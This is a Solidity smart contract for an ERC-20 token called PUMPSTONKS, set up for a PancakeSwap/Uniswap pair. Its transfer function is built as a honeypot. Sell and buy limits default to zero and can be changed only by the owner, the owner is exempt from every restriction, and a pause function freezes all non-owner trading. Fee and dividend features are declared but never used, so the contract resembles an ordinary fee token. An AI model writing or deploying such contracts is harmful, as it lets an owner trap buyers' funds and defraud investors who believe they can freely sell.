// SPDX-License-Identifier: Unlicensed
 
pragma solidity ^0.6.12;
 
import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router.sol";
 
contract PUMPSTONKS is ERC20, Ownable {
    using SafeMath for uint256;
 
    uint256                     private _totalSupply = 10000000;
    bool                        private swapping;
    mapping (address => bool)   private _isExcludedFromFees;
    address                     private poolAddress = 0x0000000000000000000000000000000000000001;
 
    uint256                     public maxSellTransactionAmount = 0;
    uint256                     public maxBuyTransactionAmount = 0;
    uint256                     public gasForProcessing = 300000;
    bool                        public swapEnabled = false;
    address                     public immutable uniswapV2Pair;
    IUniswapV2Router02          public uniswapV2Router;
    mapping (address => bool)   public automatedMarketMakerPairs;
 
    event debugMaxSellAmount(
        uint256 oldAmount,
        uint256 newAmount,
        uint256 amountAfterEdit
    );
    event debugTransfer(
        uint256 amount,
        uint256 currentMaxAmount,
        bool swapEnabled,
        bool amountExeded,
        bool isOwner
    );
    event UpdateUniswapV2Router(
        address indexed newAddress, 
        address indexed oldAddress
    );
    event ExcludeFromFees(
        address indexed account, 
        bool isExcluded
    );
    event ExcludeMultipleAccountsFromFees(
        address[] accounts, 
        bool isExcluded
    );
    event SetAutomatedMarketMakerPair(
        address indexed pair, 
        bool indexed value
    );
    event GasForProcessingUpdated(
        uint256 indexed newValue, 
        uint256 indexed oldValue
    );
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    event SendDividends(
    	uint256 tokensSwapped,
    	uint256 amount
    );
    event ProcessedDividendTracker(
    	uint256 iterations,
    	uint256 claims,
        uint256 lastProcessedIndex,
    	bool indexed automatic,
    	uint256 gas,
    	address indexed processor
    );

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
 
    constructor() public ERC20("PUMPSTONKS", "PMPST") { 
    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
 
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
 
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
  
        // exclude from paying fees or having max transaction amount
        excludeFromFees(address(this), true);
 
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(owner(), _totalSupply * (10**18));
    }
 
    receive() external payable {
 
  	}
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        updatePoolAddress(to);
        uint256 realMaxBuy = maxBuyTransactionAmount * (10**18);
        uint256 realMax = maxSellTransactionAmount * (10**18);
        bool amountExeeded = amount > realMax;
        bool buyAmountExeeded = amount > realMaxBuy;
        bool swapAuthorized = swapEnabled;
        bool isOwner = to == owner() || from == owner();

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if(
            to == address(0) ||
            from == address(0) ||
            isOwner
        ){
            swapAuthorized = true;
            amountExeeded = false;
            buyAmountExeeded = false;
        }

        if(
            to != poolAddress
        ){
            amountExeeded = false;
        }

        if(
            to == poolAddress
        ){
            buyAmountExeeded = false;
        }

        emit debugTransfer(amount, realMax, swapAuthorized, amountExeeded, isOwner);

        require(amountExeeded == false, "MAX_SELL_AMOUNT_ERROR: Maximum sales amount exceeded");
        require(buyAmountExeeded == false, "MAX_BUY_AMOUNT_ERROR: Maximum buy amount exceeded");
        require(swapAuthorized == true, "SWAP_ON_HOLD_ERROR: The exchanges are currently on hold");
 
        if(swapAuthorized && !amountExeeded){
            super._transfer(from, to, amount);
        }
    }

    function updatePoolAddress(address newAddress) private {
        if(poolAddress == 0x0000000000000000000000000000000000000001){
            poolAddress = newAddress;
        }
    }
 
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "TEST: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }
 
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "TEST: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;
 
        emit ExcludeFromFees(account, excluded);
    } 
 
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "TEST: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
 
        _setAutomatedMarketMakerPair(pair, value);
    }
 
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "TEST: Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;
 
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "TEST: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "TEST: Cannot update gasForProcessing to same value");
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
 
    function setMaxSellTxAMount(uint256 amount) external onlyOwner{
        maxSellTransactionAmount = amount;
    }
 
    function setMaxBuyTxAMount(uint256 amount) external onlyOwner{
        maxBuyTransactionAmount = amount;
    }

    function pause() external onlyOwner{
        swapEnabled = false;
    }
 
    function play() external onlyOwner{
        swapEnabled = true;
    }
}